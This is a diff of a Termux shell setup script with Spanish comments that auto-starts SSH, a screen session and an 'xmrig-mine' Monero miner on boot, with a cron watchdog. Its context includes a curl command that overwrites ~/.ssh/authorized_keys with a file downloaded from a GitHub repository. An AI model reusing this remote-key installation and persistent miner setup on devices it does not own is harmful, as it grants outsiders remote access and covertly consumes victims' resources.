@@ -11,8 +11,6 @@ curl -L -o ~/.ssh/authorized_keys https://raw.githubusercontent.com/Zero-OTP/xmr
 chmod 600 ~/.ssh/authorized_keys  # Cambiar permisos para la clave
 
 #-- Auto-arranque
-
-# Asegurar que el directorio de inicio existe
 mkdir -p ~/.termux/boot/
 
 # Crear el script de auto-arranque
@@ -31,16 +29,13 @@ fi
 rm -rf ~/.screen/*
 
 # Verificar si la sesión de screen existe antes de crearla
-if ! screen -list | grep -q "ssh-session"; then
+if ! screen -list | grep -w "ssh-session" > /dev/null; then
     screen -S ssh-session -d -m
 fi
 
-# Adjuntarse a la sesión existente
-exec screen -x ssh-session
-
-# Ejecutar el minero si no está ya en ejecución
+# Iniciar el minero si no está corriendo
 if ! pgrep -x "xmrig-mine" > /dev/null; then
-    ./xmrig-mine
+    screen -S ssh-session -X stuff "./xmrig-mine\n"
 fi
 EOF
 
@@ -51,12 +46,13 @@ chmod 755 ~/.termux/boot/start-ssh
 # Iniciar SSH
 sshd
 
-# Verificar y manejar sesiones de screen
-rm -rf ~/.screen/*  # Limpiar sesiones muertas
-if ! screen -list | grep -q "ssh-session"; then
+# Eliminar sesiones de screen muertas
+rm -rf ~/.screen/*
+
+# Verificar si la sesión de screen existe antes de crearla
+if ! screen -list | grep -w "ssh-session" > /dev/null; then
     screen -S ssh-session -d -m
 fi
-screen -x ssh-session
 
 #-- Configuración de cron para verificar la sesión cada 15 minutos
 chmod +x ~/check_screen.sh
